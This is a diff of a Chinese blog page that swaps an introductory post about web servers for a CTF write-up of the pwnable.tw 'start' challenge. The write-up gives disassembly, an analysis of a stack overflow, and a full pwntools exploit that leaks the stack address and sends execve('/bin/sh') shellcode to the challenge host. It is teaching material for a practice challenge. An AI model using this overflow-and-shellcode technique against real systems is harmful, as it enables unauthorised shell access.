@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>什么是web_server | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" webpwn ">
-  <meta name="description" content="什么是web_server | sixpar&#39;s blog">
+  <title>pwnable.tw-start | sixpar&#39;s blog</title>
+  <meta name="keywords" content=" 汇编 , shellcode ">
+  <meta name="description" content="pwnable.tw-start | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="欢迎您的访问 想了解我？ 我只是某不知名的pwn手噢~">
 <meta property="og:type" content="website">
@@ -508,9 +508,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-什么是web-server" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-pwnable-tw-start" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">什么是web_server</h1>
+        <h1 class="article-title">pwnable.tw-start</h1>
     
     <div class="article-meta">
         
@@ -520,7 +520,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="学习">学习</a>
+            <a  data-rel="PWN题">PWN题</a>
             
         </span>
         
@@ -528,19 +528,21 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color2">webpwn</a>
+            <a class="color3">汇编</a>
+            
+            <a class="color5">shellcode</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-05 21:49:03'>2020-07-05 21:37</time>
+            Created At : <time class="date" title='Updated At: 2020-07-09 00:08:51'>2020-07-09 00:08</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:693</span>
+        <span>Count:1.1k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -570,7 +572,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#什么是-server-？"><span class="toc-text">什么是 server ？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#什么是-Web-Server？"><span class="toc-text">什么是 Web Server？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何提供-HTTP-服务？"><span class="toc-text">如何提供 HTTP 服务？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提供HTTP服务的web-server分类"><span class="toc-text">提供HTTP服务的web server分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-静态文件服务器"><span class="toc-text">1. 静态文件服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-动态内容服务器"><span class="toc-text">2. 动态内容服务器</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#保护机制："><span class="toc-text">保护机制：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析程序："><span class="toc-text">分析程序：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用分析："><span class="toc-text">漏洞利用分析：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路："><span class="toc-text">利用思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-text">exp:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-text">总结：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -586,39 +588,66 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>今晚突然想了解一下什么是 web server pwn</p>
+        <h2 id="保护机制："><a href="#保护机制：" class="headerlink" title="保护机制："></a>保护机制：</h2><blockquote>
+<p>Arch:     i386-32-little<br>RELRO:    No RELRO<br>Stack:    No canary found<br>NX:       NX disabled<br>PIE:      No PIE (0x8048000)</p>
 </blockquote>
-<h2 id="什么是-server-？"><a href="#什么是-server-？" class="headerlink" title="什么是 server ？"></a>什么是 server ？</h2><p>一般来说 server （服务器）有两重意思</p>
-<blockquote>
-<ul>
-<li>1.表示硬件，也就是一台机器。它还有另一个名字：「主机」。</li>
-<li>2.表示软件程序，这种程序主要用来对外提供某些服务，比如邮件服务、FTP 服务、数据库服务、网页服务等。</li>
-</ul>
-</blockquote>
-<p>作为开发者，我们说 server 的时候，一般指的后者，也就是一个 24 小时运行的软件程序。而一台主机上面可以运行多个这样的程序。</p>
-<h2 id="什么是-Web-Server？"><a href="#什么是-Web-Server？" class="headerlink" title="什么是 Web Server？"></a>什么是 Web Server？</h2><p>顾名思义Web Server 就是<code>提供 Web 服务的 Server</code>。<br>比如我们访问 <a href="http://baidu.com，其实就是在使用百度的" target="_blank" rel="noopener">http://baidu.com，其实就是在使用百度的</a> Server 提供的web服务。</p>
-<p>web server的主要功能是：<code>存储，处理和传递网页给客户</code></p>
-<p>它只需支持HTTP协议、HTML文档格式及URL，与客户端的网络浏览器配合。因为Web服务器主要支持的协议就是HTTP，所以通常情况下HTTP服务器和WEB服务器是相等的(有没有支持除HTTP之外的协议的web服务器，没有考证过）<br>所以 Web Server 一般对外提供的是 HTTP 服务（也可以是其他服务），这就是为什么我们的网址都以「http://」开头。</p>
-<h2 id="如何提供-HTTP-服务？"><a href="#如何提供-HTTP-服务？" class="headerlink" title="如何提供 HTTP 服务？"></a>如何提供 HTTP 服务？</h2><p>下面是用 Node.js 写的一个最简单的 HTTP server：</p>
-<pre><code class="javascript">// 文件名 index.js
-// 使用 node index.js 即可运行本程序
+<h2 id="分析程序："><a href="#分析程序：" class="headerlink" title="分析程序："></a>分析程序：</h2><p>通篇只有start函数和exit函数，而且都是以汇编的形式。<br>主程序如下：</p>
+<pre><code class="c">.text:08048060                 push    esp
+.text:08048061                 push    offset _exit
+.text:08048066                 xor     eax, eax
+.text:08048068                 xor     ebx, ebx
+.text:0804806A                 xor     ecx, ecx
+.text:0804806C                 xor     edx, edx
+.text:0804806E                 push    3A465443h
+.text:08048073                 push    20656874h
+.text:08048078                 push    20747261h
+.text:0804807D                 push    74732073h
+.text:08048082                 push    2774654Ch
+.text:08048087                 mov     ecx, esp        ; addr
+.text:08048089                 mov     dl, 14h         ; len
+.text:0804808B                 mov     bl, 1           ; fd
+.text:0804808D                 mov     al, 4
+.text:0804808F                 int     80h             ; LINUX - sys_write
+.text:08048091                 xor     ebx, ebx
+.text:08048093                 mov     dl, 3Ch
+.text:08048095                 mov     al, 3
+.text:08048097                 int     80h             ; LINUX -
+.text:08048099                 add     esp, 14h
+.text:0804809C                 retn</code></pre>
+<p>下面来详细分析：<br>首先060（简写，即0x08048060，下同）处push esp，将当前esp的地址压入栈。<br>然后061处把exit函数的返回地址压入栈中。<br>066-06c清空寄存器。因为寄存器等会要拿来传参。<br>然后06e-082处push一堆字符串入栈（总共0x14字节）。字符串转为ascall码是“Let’s start the CTF:”<br>087-08f这段：eax为4表明系统调用号为4号即write函数。把寄存器ecx指向之前push进栈的字符串，所以很明显是要打印刚刚的字符串咯。等一切参数设置好以后，int 80h 来system_call系统调用。<br>091-097这一段：xor清空ebx，令eax=3即read函数，edx=0x3c，表明要往栈中read读取 0x3c （60）个字节。<br>接下来099处的 add esp,14h  表明回收栈帧，清理栈空间。<br>09c是retn返回地址。</p>
+<h2 id="漏洞利用分析："><a href="#漏洞利用分析：" class="headerlink" title="漏洞利用分析："></a>漏洞利用分析：</h2><p>首先程序把esp地址存入了栈中，这就是在提示我们可以去泄露它。并且本题没有开启ASLR和PIE。可以泄露。</p>
+<p>其次是write这里，write既然提供打印功能，那我们也就要认识到，可不可以稍微做一点修改，能让write打印出上面的esp的地址呢。  </p>
+<p>再然后就是read函数这里很明显存在着溢出点。栈大小估计是只有0x14大小，而现在可以读取0x3c字节，妥妥溢出。</p>
+<h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><p>当程序段末尾回收掉 0x14 字节栈帧后，最高地址就是exit函数的地址（返回地址），我们可以把返回地址覆盖为 0x8048087（mov ecx,esp 指令，位于write系统调用程序片段首部），于是retn时便可将控制流劫持到mov ecx,esp后，并且栈中esp的地址自动+4，此时栈顶esp存放的正好是本程序第一个语句push 进来的esp的地址。程序流被修改了，故下一条语句是mov ecx,esp，即将write的参数ecx的值指向栈顶。于是借用write系统调用，我们便能把一开始push入栈的esp的地址给泄露出来了。</p>
+<p>由于程序流被劫持，重新来到了write函数片段处执行，而代码顺序从上到下执行，所以又要调用read，我们又有一次输入的机会。</p>
+<p>这一次我们布置shellcode，利用泄露出来的栈地址，我们知道了栈地址，便可把shellcode布置到栈上，然后劫持程序流跳到shellcode并执行。<br>所以我们可以直接在第二次read系统调用中溢出将shellcode部分写在esp+0x14的栈内存中，并用这个地址覆盖返回地址，因为第二次还会有add esp，14h这条指令，所以实际覆盖点还要调高0x14个字节。<br>所以最终我们覆盖返回地址为 esp+0x14。然后返回地址之后跟上我们的shellcode，随后便会跳转到我们的shellcode处并执行</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><pre><code class="python">#!/usr/bin/env python2
+# -*- coding: utf-8 -*-
+from pwn import  *
+io = remote(&#39;chall.pwnable.tw&#39;,10000)
+# io =process(&#39;./start&#39;)
+#shellcode
+shellcode=&quot;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&quot;
+log.success(&#39;len(shellcode) = &#39; + hex(len(shellcode)))
 
-var http = require(&#39;http&#39;)
+#leak esp
+payload = &#39;a&#39;*0x14 + p32(0x08048087)  # 硬编码覆盖返回地址为 mov ecx, esp 指令所在地址
+# retn to write
+# write打印的参数是ecx，而ecx=esp地址。
+io.recv()
+io.send(payload)
 
-var server = http.createServer( function (request, response){
-    response.end(&#39;这是页面内容，你请求的路径是：&#39; + request.url)
-})
+esp=u32(io.recv()[:4])
+log.success(&#39;esp = &#39; + hex(esp))
+stack = esp + 0x14  
+log.success(&#39;target addr = &#39; + hex(stack))  
 
-server.listen(8080, function(){
-    console.log(&quot;正在监听 %s 端口&quot;, 8080);
-});</code></pre>
-<p>这就是一个最简单的 HTTP server。<br>你不用看懂这段程序，你只需要知道两件事情：<br>1.这段程序监听了当前机器的 8080 端口。<br>2.一旦外部访问当前机器的 8080 端口，这段程序就会返回一段文字。</p>
-<h2 id="提供HTTP服务的web-server分类"><a href="#提供HTTP服务的web-server分类" class="headerlink" title="提供HTTP服务的web server分类"></a>提供HTTP服务的web server分类</h2><p>提供 HTTP 服务的 web server 分为两类。</p>
-<h3 id="1-静态文件服务器"><a href="#1-静态文件服务器" class="headerlink" title="1. 静态文件服务器"></a>1. 静态文件服务器</h3><p>这种服务器简单地根据访问路径，<code>返回对应路径下的文件</code>。</p>
-<p>比如用户访问 http:// 123.123.123.123:8080/a/b/c/d.html，那么这种服务器就会在网站根目录找到 a/b/c/d.html 文件，原样返回给用户。</p>
-<h3 id="2-动态内容服务器"><a href="#2-动态内容服务器" class="headerlink" title="2. 动态内容服务器"></a>2. 动态内容服务器</h3><p>这种服务器返回的内容一般不是文件，而是<code>动态生成的字符串</code>（比如从数据库中获取的字符串）。</p>
-<p>比如用户访问 http:// <a href="http://weibo.com/home，那么这种" target="_blank" rel="noopener">http://weibo.com/home，那么这种</a> <a href="http://weibo.com" target="_blank" rel="noopener">http://weibo.com</a> 的服务器则会返回当前用户最新的消息。显然<code>每个用户得到的内容是不一样的</code>。</p>
+#get shell
+payload = &#39;a&#39;*0x14 + p32(stack) + shellcode
+io.send(payload)
+
+io.interactive()</code></pre>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>本题要求能看懂汇编代码。并且要搞清楚esp的运作。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
